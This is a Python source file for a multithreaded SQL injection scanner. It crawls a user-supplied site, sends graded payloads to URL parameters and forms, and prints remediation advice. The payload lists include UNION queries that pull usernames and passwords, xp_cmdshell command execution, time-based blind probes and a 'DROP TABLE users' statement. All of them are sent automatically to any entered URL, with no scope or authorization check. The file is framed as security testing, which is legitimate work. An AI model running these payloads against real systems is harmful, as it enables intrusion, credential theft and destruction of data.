import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# SQL Injection Payloads by Severity Level
LEVEL_1_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "\" OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"a\"=\"a"
]

LEVEL_2_PAYLOADS = [
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --",
    "' OR EXISTS(SELECT * FROM information_schema.tables) --"
]

LEVEL_3_PAYLOADS = [
    "'; EXEC xp_cmdshell('whoami') --",  # MSSQL RCE
    "'; DROP TABLE users --",
    "' OR 1=1; WAITFOR DELAY '0:0:5' --",  # Time-based blind
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --",  # MySQL time-based
    "' OR 1=1; SELECT pg_sleep(5) --",  # PostgreSQL time-based
    "' AND 1=1; DECLARE @q NVARCHAR(200); SET @q='SELECT * FROM users'; EXEC(@q) --"  # Dynamic SQL
]

# Database error patterns
DB_ERRORS = {
    "MySQL": ["You have an error in your SQL syntax", "MySQL server version"],
    "PostgreSQL": ["syntax error at or near", "unterminated quoted string"],
    "MSSQL": ["Microsoft OLE DB", "Unclosed quotation mark"],
    "Oracle": ["ORA-", "quoted string not properly terminated"],
    "SQLite": ["SQLite error", "unrecognized token"]
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

class SQLIScanner:
    def __init__(self):
        self.visited_urls = set()
        self.scan_results = []
        self.lock = Lock()
        self.vulnerability_level = 0  # 0 = none, 1 = basic, 2 = intermediate, 3 = critical

    def crawl(self, url, depth=2):
        if depth == 0 or url in self.visited_urls:
            return

        with self.lock:
            self.visited_urls.add(url)

        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            
            links = [urljoin(url, link["href"]) for link in soup.find_all("a", href=True)]
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for next_url in links:
                    if urlparse(next_url).netloc == urlparse(url).netloc:
                        futures.append(executor.submit(self.crawl, next_url, depth - 1))
                        futures.append(executor.submit(self.test_sqli, next_url))

                for future in as_completed(futures):
                    future.result()

        except requests.RequestException:
            pass

    def test_sqli(self, url):
        self.extract_params_and_test(url)

    def extract_params_and_test(self, url):
        try:
            response = requests.get(url, headers=HEADERS, timeout=5)
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)

            # Test all payload levels
            with ThreadPoolExecutor(max_workers=15) as executor:
                # Test GET parameters
                futures = []
                for param in query_params:
                    for level, payloads in enumerate([LEVEL_1_PAYLOADS, LEVEL_2_PAYLOADS, LEVEL_3_PAYLOADS], 1):
                        for payload in payloads:
                            injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param}={payload}"
                            futures.append(executor.submit(
                                self.test_injection, 
                                injected_url, 
                                "GET", 
                                payload, 
                                level
                            ))

                # Test forms
                soup = BeautifulSoup(response.text, "html.parser")
                for form in soup.find_all("form"):
                    action = form.get("action")
                    form_url = urljoin(url, action)
                    form_data = {}
                    for input_field in form.find_all("input"):
                        name = input_field.get("name")
                        if name:
                            for level, payloads in enumerate([LEVEL_1_PAYLOADS, LEVEL_2_PAYLOADS, LEVEL_3_PAYLOADS], 1):
                                for payload in payloads[:2]:  # Limit payloads per form field
                                    form_data[name] = payload
                                    futures.append(executor.submit(
                                        self.test_post, 
                                        form_url, 
                                        form_data.copy(), 
                                        level
                                    ))

                for future in as_completed(futures):
                    future.result()

        except requests.RequestException:
            pass

    def test_post(self, url, form_data, level):
        try:
            response = requests.post(url, data=form_data, headers=HEADERS, timeout=10)
            self.analyze_response(response, url, "POST", form_data, level)
        except requests.RequestException:
            pass

    def test_injection(self, url, method, payload, level):
        try:
            response = requests.get(url, headers=HEADERS, timeout=10)
            self.analyze_response(response, url, method, payload, level)
        except requests.RequestException:
            pass

    def analyze_response(self, response, url, method, payload, level):
        # Check for error-based SQLi
        for db, errors in DB_ERRORS.items():
            if any(error in response.text for error in errors):
                with self.lock:
                    self.vulnerability_level = max(self.vulnerability_level, level)
                    result = f"[LEVEL {level}] SQLi Detected at {url} via {method} (DB: {db})\nPayload: {payload}"
                    self.scan_results.append(result)
                return

        # Check for time-based blind SQLi
        if response.elapsed.total_seconds() > 5 and any(delay_payload in payload for delay_payload in ["SLEEP(", "WAITFOR", "pg_sleep"]):
            with self.lock:
                self.vulnerability_level = max(self.vulnerability_level, 3)
                result = f"[LEVEL 3] Blind SQLi (Time-based) Detected at {url} via {method}\nPayload: {payload}"
                self.scan_results.append(result)

    def get_remediation_advice(self):
        advice = "\n\n=== SECURITY RECOMMENDATIONS ==="
        
        if self.vulnerability_level >= 1:
            advice += "\n\n[Basic SQLi Detected]"
            advice += "\n1. Implement input validation for all user-supplied data"
            advice += "\n2. Use parameterized queries or prepared statements"
            advice += "\n3. Apply the principle of least privilege to database accounts"
        
        if self.vulnerability_level >= 2:
            advice += "\n\n[Intermediate SQLi Detected - Data Extraction]"
            advice += "\n1. Implement strict input filtering for special characters"
            advice += "\n2. Use stored procedures with parameter binding"
            advice += "\n3. Consider using ORM frameworks with built-in protection"
            advice += "\n4. Implement rate limiting to prevent automated attacks"
        
        if self.vulnerability_level >= 3:
            advice += "\n\n[CRITICAL SQLi Detected - RCE/Data Manipulation]"
            advice += "\n1. IMMEDIATELY patch the vulnerable endpoints"
            advice += "\n2. Audit database for unauthorized changes"
            advice += "\n3. Implement Web Application Firewall rules"
            advice += "\n4. Conduct a full security audit of the application"
            advice += "\n5. Consider database migration if using outdated systems"
        
        advice += "\n\nGeneral Best Practices:"
        advice += "\n- Regularly update database software and libraries"
        advice += "\n- Implement proper error handling (don't expose DB errors)"
        advice += "\n- Conduct regular security testing"
        
        return advice

    def scan_application(self, base_url, depth=2):
        self.scan_results.append(f"Starting scan on {base_url}")
        self.crawl(base_url, depth)

        if self.scan_results:
            results = "\n".join(self.scan_results)
            results += self.get_remediation_advice()
            return results
        return "No SQL injection vulnerabilities detected."

def scan_application(target, depth=2):
    scanner = SQLIScanner()
    return scanner.scan_application(target, depth)

# Example usage
if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    results = scan_application(target_url, depth=2)
    print(results)